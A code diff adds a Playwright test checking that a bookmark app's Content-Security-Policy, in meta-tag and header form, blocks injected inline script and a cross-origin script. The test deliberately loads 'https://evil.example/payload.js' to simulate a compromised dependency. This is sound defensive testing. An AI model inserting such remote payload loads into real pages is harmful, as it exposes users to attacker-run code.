@@ -1,3 +1,5 @@
+import { readFile } from 'node:fs/promises';
+import { fileURLToPath } from 'node:url';
 import { type BrowserContext, expect, type Page, test } from '@playwright/test';
 import {
   BookmarkContainer,
@@ -749,6 +751,86 @@ test('a hostile page cannot inject through the metadata it suggests', async ({ b
   expect(new URL(page.url()).origin).toBe(origin);
   await expect(page.getByTestId('addForm')).toBeVisible();
   expect(errors).toEqual([]);
+
+  await ctx.close();
+});
+
+test('the CSP is served in both forms and blocks script the renderer would not', async ({
+  browser,
+}) => {
+  const ctx = await browser.newContext();
+  const page = await ctx.newPage();
+  // Violations are the direct evidence: the browser reports which directive refused what.
+  const violations: string[] = [];
+  await page.addInitScript(() => {
+    document.addEventListener('securitypolicyviolation', (event) => {
+      ((window as unknown as { __violations: string[] }).__violations ??= []).push(
+        event.violatedDirective,
+      );
+    });
+  });
+  await page.goto('/');
+
+  const metaPolicy = await page
+    .locator('meta[http-equiv="Content-Security-Policy"]')
+    .getAttribute('content');
+  expect(metaPolicy).toContain("script-src 'self'");
+  expect(metaPolicy).not.toContain('unsafe-eval');
+  // 'unsafe-inline' is permitted for style *attributes* only, so the bare token must not
+  // appear in script-src or style-src.
+  expect(metaPolicy).toContain("style-src-attr 'unsafe-inline'");
+  expect(metaPolicy).not.toMatch(/script-src [^;]*unsafe-inline/);
+  expect(metaPolicy).not.toMatch(/style-src [^;]*unsafe-inline/);
+
+  // Inline script: what an innerHTML sink would give an attacker. Blocked, so a future
+  // one is a console error rather than an exploit.
+  const inlineRan = await page.evaluate(async () => {
+    const script = document.createElement('script');
+    script.textContent = 'window.__cspBypassed = true;';
+    document.head.append(script);
+    await new Promise((resolve) => setTimeout(resolve, 50));
+    return '__cspBypassed' in window;
+  });
+  expect(inlineRan).toBe(false);
+
+  // A script from another origin, which is how a compromised dependency would phone home.
+  const externalRan = await page.evaluate(async () => {
+    const script = document.createElement('script');
+    script.src = 'https://evil.example/payload.js';
+    document.head.append(script);
+    await new Promise((resolve) => setTimeout(resolve, 100));
+    return script.dataset.loaded === 'yes';
+  });
+  expect(externalRan).toBe(false);
+
+  violations.push(
+    ...(await page.evaluate(() => (window as unknown as { __violations?: string[] }).__violations ?? [])),
+  );
+  // Reported as `script-src-elem`, the directive that inherits from `script-src` for
+  // <script> elements specifically — one violation for each of the two attempts above.
+  expect(violations).toHaveLength(2);
+  expect(violations.every((directive) => directive.startsWith('script-src'))).toBe(true);
+
+  // The production form is a real header, generated from the same list, so the two must
+  // agree on everything except the directives a meta tag cannot express.
+  const headersFile = await readFile(
+    fileURLToPath(new URL('../dist/_headers', import.meta.url)),
+    'utf8',
+  );
+  const headerPolicy = /^\s*Content-Security-Policy:\s*(.+)$/m.exec(headersFile)?.[1]?.trim();
+  expect(headerPolicy).toBeTruthy();
+  expect(headerPolicy).toContain("frame-ancestors 'none'");
+  const withoutFrameAncestors = headerPolicy!
+    .split(';')
+    .map((directive) => directive.trim())
+    .filter((directive) => !directive.startsWith('frame-ancestors'))
+    .join('; ');
+  expect(withoutFrameAncestors).toBe(metaPolicy);
+
+  // The headers that only exist in the served form.
+  expect(headersFile).toContain('X-Frame-Options: DENY');
+  expect(headersFile).toContain('X-Content-Type-Options: nosniff');
+  expect(headersFile).toContain('Referrer-Policy: no-referrer');
 
   await ctx.close();
 });
